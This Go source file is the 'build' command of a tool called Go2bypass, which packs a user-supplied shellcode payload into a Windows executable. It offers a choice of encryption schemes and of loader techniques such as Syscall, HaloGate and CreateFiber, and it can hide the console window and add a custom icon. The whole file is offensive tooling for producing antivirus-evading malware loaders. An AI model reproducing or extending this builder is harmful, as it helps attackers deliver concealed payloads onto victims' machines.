package cmd

import (
	Go2public "Go2bypass/Public"
	"os"

	"github.com/spf13/cobra"
)

// buildCmd represents the build command
var err error
var buildCmd = &cobra.Command{
	Use:   "build",
	Short: "Go build to Shellcodeloader",
	Long:  `Choose different encryption methods and Windows api for shellcodeloader.`,
	Run: func(cmd *cobra.Command, args []string) {
		getflag(cmd)
	},
	Example: `go run .\Go2bypass.go build -e Encrypt-modu -f payload.bin -m loader-modu
go run .\Go2bypass.go build -e Encrypt-modu -f payload.bin -m loader-modu --hiddenCMD
go run .\Go2bypass.go build -e Encrypt-modu -f payload.bin -m loader-modu --hiddenCMD -i .ico
go run .\Go2bypass.go build -e Encrypt-modu -f payload.bin -m Syscall
go run .\Go2bypass.go build -e Encrypt-modu -f payload.bin -m HaloGate
go run .\Go2bypass.go build -e Encrypt-modu -f payload.bin -m HeapAlloc
go run .\Go2bypass.go build -e Encrypt-modu -f payload.bin -m UuidFromString
go run .\Go2bypass.go build -e Encrypt-modu -f payload.bin -m EtwpCreateEtwThread
go run .\Go2bypass.go build -e Encrypt-modu -f payload.bin -m EnumPageFilesW
go run .\Go2bypass.go build -e Encrypt-modu -f payload.bin -m EnumChildWindows
go run .\Go2bypass.go build -e Encrypt-modu -f payload.bin -m EnumerateLoadedModules
go run .\Go2bypass.go build -e Encrypt-modu -f payload.bin -m CreateFiber
go run .\Go2bypass.go build -e Encrypt-modu -f payload.bin -m CreateThread
go run .\Go2bypass.go build -e Encrypt-modu -f payload.bin -m CreateThreatPoolWait
`,
}

func getflag(cmd *cobra.Command) {
	module, err := cmd.Flags().GetString("module")
	if err != nil || module == "" {
		cmd.Help()
		os.Exit(0)
	}
	file, err := cmd.Flags().GetString("file")
	if err != nil || file == "" {
		cmd.Help()
		os.Exit(0)
	}
	hiddenCMD, _ := cmd.Flags().GetBool("hiddenCMD")
	if hiddenCMD {
		Go2public.ReplaceStr["HideConsole"] = "Go2public.HideConsole()"
	}
	//random, _ := cmd.Flags().GetBool("random")
	encrypt, err := cmd.Flags().GetString("encrypt")
	if encrypt != "" {
		Go2public.ReplaceStr["DecodeType"] = "ApiDe=Go2public." + encrypt + "{}"
	} else {
		os.Exit(0)
	}
	output, _ := cmd.Flags().GetString("output")
	if output == "" {
		output = encrypt + "_" + module + ".exe"
	} else {
		output = encrypt + "_" + output
	}
	icon, _ := cmd.Flags().GetString("icon")
	Go2public.Build.SetBuilFile(module, file, encrypt, output, icon, hiddenCMD)
	Go2public.Build.ReadFile()
	Go2public.Build.SelectEncryp()
}
func init() {
	rootCmd.AddCommand(buildCmd)
	buildCmd.Flags().StringP("module", "m", "", "Select The Mode Of The ShellcodeLoader \n    eg:\n\tSyscall\n\tHaloGate\n\tHeapAlloc\n\tUuidFromString\n\tEtwpCreateEtwThread\n\tEnumPageFilesW\n\tEnumChildWindows\n\tEnumerateLoadedModules\n\tCreateFiber\n\tCreateThread\n\tCreateThreatPoolWait")
	buildCmd.Flags().StringP("file", "f", "", "Specify The Path To The (x64)payload.bin File")
	buildCmd.Flags().StringP("encrypt", "e", "", "Choose Encryption Method\n    eg:\n\tAesCBC\n\tAesECB\n\tAesCFB\n\tBase64Xor\n\tQianKunBaGua")
	buildCmd.Flags().StringP("icon", "i", "", "Add icon")
	buildCmd.Flags().StringP("output", "o", "", "Output FileName")
	buildCmd.Flags().BoolP("hiddenCMD", "c", false, "Use \"go build -ldflags=-H=windowsgui\" hiddenCMD Or use Windows Api hidden cmd default:(-ldflags=-H=windowsgui)")
	//buildCmd.Flags().BoolP("random", "r", false, "Use garble.exe random function And Main.go default:(random=false)")
}
